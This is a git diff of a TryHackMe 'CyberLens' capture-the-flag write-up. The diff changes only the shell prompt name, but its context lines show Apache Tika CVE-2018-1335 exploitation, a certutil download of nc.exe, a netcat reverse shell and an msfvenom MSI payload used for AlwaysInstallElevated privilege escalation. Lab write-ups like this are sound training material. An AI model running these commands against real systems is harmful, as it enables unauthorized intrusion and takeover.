@@ -33,7 +33,7 @@ Things to Note
 We can use [Nmap](../../3%20-%20Tags/Hacking%20Tools/Nmap.md) to scan our target :
 
 ```
-┌──(hax㉿HaxonKali)-[~/THM/CHALLENGES/Easy/Cybelens]
+┌──(mdn0x㉿mdn0xKali)-[~/THM/CHALLENGES/Easy/Cybelens]
 └─$ nmap cyberlens.thm -T5 -Pn -v
 PORT      STATE    SERVICE
 7/tcp     filtered echo
@@ -104,7 +104,7 @@ We read all the report and we have an exploit :
 We can copy it in a file in our working dir and execute it with [Python](../../3%20-%20Tags/Programming%20Languages/Python.md) 3 :
 
 ```
-┌──(hax㉿HaxonKali)-[~/THM/CHALLENGES/Easy/Cybelens]
+┌──(mdn0x㉿mdn0xKali)-[~/THM/CHALLENGES/Easy/Cybelens]
 └─$ python3 exploit.py       
 Usage: python3 CVE-2018-1335.py <host> <port> <command>
 Example: python3 CVE-2018-1335.py localhost 9998 calc.exe
@@ -114,7 +114,7 @@ Example: python3 CVE-2018-1335.py localhost 9998 calc.exe
 So we need a command and we need a shell so we need to install [Netcat](../../3%20-%20Tags/Hacking%20Tools/Netcat.md) on the [Vulnerable Machine](../../3%20-%20Tags/Hacking%20Concepts/Vulnerable%20Machine.md) by `locate nc.exe` and then `cp path/nc.exe .` and hosting a simple web server :
 
 ```
-┌──(hax㉿HaxonKali)-[~/THM/CHALLENGES/Easy/Cybelens]
+┌──(mdn0x㉿mdn0xKali)-[~/THM/CHALLENGES/Easy/Cybelens]
 └─$ python3 -m http.server 8080
 Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
 
@@ -123,7 +123,7 @@ Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
 Now we transfer :
 
 ```
-┌──(hax㉿HaxonKali)-[~/THM/CHALLENGES/Easy/Cybelens]
+┌──(mdn0x㉿mdn0xKali)-[~/THM/CHALLENGES/Easy/Cybelens]
 └─$ python3 exploit.py cyberlens.thm 61777 "certutil -urlcache -f http://10.8.162.183:8080/nc.exe C:/Users/Public/nc.exe"
 
 ```
@@ -131,7 +131,7 @@ Now we transfer :
 We should see that in the server :
 
 ```
-──(hax㉿HaxonKali)-[~/…/CHALLENGES/Easy/Cybelens/web-server]
+──(mdn0x㉿mdn0xKali)-[~/…/CHALLENGES/Easy/Cybelens/web-server]
 └─$ python3 -m http.server 80  
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 10.10.60.241 - - [12/Jul/2025 12:39:40] "GET /nc.exe HTTP/1.1" 200 -
@@ -148,7 +148,7 @@ Keyboard interrupt received, exiting.
 We can close it and open a [Netcat](../../3%20-%20Tags/Hacking%20Tools/Netcat.md) listener :
 
 ```
-──(hax㉿HaxonKali)-[~/…/CHALLENGES/Easy/Cybelens/web-server]
+──(mdn0x㉿mdn0xKali)-[~/…/CHALLENGES/Easy/Cybelens/web-server]
 └─$ nc -lvnp 1337 
 listening on [any] 1337 ...
 
@@ -157,7 +157,7 @@ listening on [any] 1337 ...
 Now we execute the [Exploit](../../3%20-%20Tags/Hacking%20Concepts/Exploit.md) :
 
 ```
-┌──(hax㉿HaxonKali)-[~/THM/CHALLENGES/Easy/Cybelens]
+┌──(mdn0x㉿mdn0xKali)-[~/THM/CHALLENGES/Easy/Cybelens]
 └─$ python3 exploit.py cyberlens.thm 61777 "C:/Users/Public/nc.exe 10.8.162.183 1337 -e cmd.exe"
 
 ```
@@ -165,7 +165,7 @@ Now we execute the [Exploit](../../3%20-%20Tags/Hacking%20Concepts/Exploit.md) :
 And we check [Netcat](../../3%20-%20Tags/Hacking%20Tools/Netcat.md) listener :
 
 ```
-┌──(hax㉿HaxonKali)-[~/…/CHALLENGES/Easy/Cybelens/web-server]
+┌──(mdn0x㉿mdn0xKali)-[~/…/CHALLENGES/Easy/Cybelens/web-server]
 └─$ nc -lvnp 1337 
 listening on [any] 1337 ...
 connect to [10.8.162.183] from (UNKNOWN) [10.10.60.241] 49859
@@ -235,7 +235,7 @@ We search it on Internet and find we can install **MSI** files with elevated pe
 We copy our [Payload](../../3%20-%20Tags/Hacking%20Concepts/Payload.md) :
 
 ```
-┌──(hax㉿HaxonKali)-[~/…/CHALLENGES/Easy/Cybelens/web-server]
+┌──(mdn0x㉿mdn0xKali)-[~/…/CHALLENGES/Easy/Cybelens/web-server]
 └─$ msfvenom --platform windows --arch x64 --payload windows/x64/shell_reverse_tcp LHOST=10.8.162.183 LPORT=4444 --encoder x64/xor --iterations 9 --format msi --out AlwaysInstallElevated.msi
 Found 1 compatible encoders
 Attempting to encode payload with 9 iterations of x64/xor
@@ -258,7 +258,7 @@ Saved as: AlwaysInstallElevated.msi
 Now we go back to our Target and download it with our [Server](../../3%20-%20Tags/Hacking%20Concepts/Server.md) :
 
 ```
-┌──(hax㉿HaxonKali)-[~/…/CHALLENGES/Easy/Cybelens/web-server]
+┌──(mdn0x㉿mdn0xKali)-[~/…/CHALLENGES/Easy/Cybelens/web-server]
 └─$ python3 -m http.server 80
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 10.10.60.241 - - [12/Jul/2025 13:48:03] "GET /AlwaysInstallElevated.msi HTTP/1.1" 200 -
@@ -277,7 +277,7 @@ CertUtil: -URLCache command completed successfully.
 Now we setup our listener on the port we enter in the [Payload](../../3%20-%20Tags/Hacking%20Concepts/Payload.md) with [Netcat](../../3%20-%20Tags/Hacking%20Tools/Netcat.md) :
 
 ```
-┌──(hax㉿HaxonKali)-[~/…/CHALLENGES/Easy/Cybelens/web-server]
+┌──(mdn0x㉿mdn0xKali)-[~/…/CHALLENGES/Easy/Cybelens/web-server]
 └─$ nc -lvnp 4444  
 
 ```
@@ -291,7 +291,7 @@ C:\Users\CyberLens\Desktop>msiexec /quiet /qn /i AlwaysInstallElevated.msi
 And we have it :
 
 ```
-┌──(hax㉿HaxonKali)-[~/THM/CHALLENGES/Easy/Cybelens]
+┌──(mdn0x㉿mdn0xKali)-[~/THM/CHALLENGES/Easy/Cybelens]
 └─$ nc -lvnp 4444 
 listening on [any] 4444 ...
 connect to [10.8.162.183] from (UNKNOWN) [10.10.60.241] 49913
@@ -319,7 +319,7 @@ We can open the [Metasploit](../../3%20-%20Tags/Hacking%20Tools/Metasploit.md) c
 We search for apache tika and use that :
 
 ```
-┌──(hax㉿HaxonKali)-[~/…/CHALLENGES/Easy/Cybelens/web-server]
+┌──(mdn0x㉿mdn0xKali)-[~/…/CHALLENGES/Easy/Cybelens/web-server]
 └─$ msfconsole -q
 msf6 > search apache tika
 
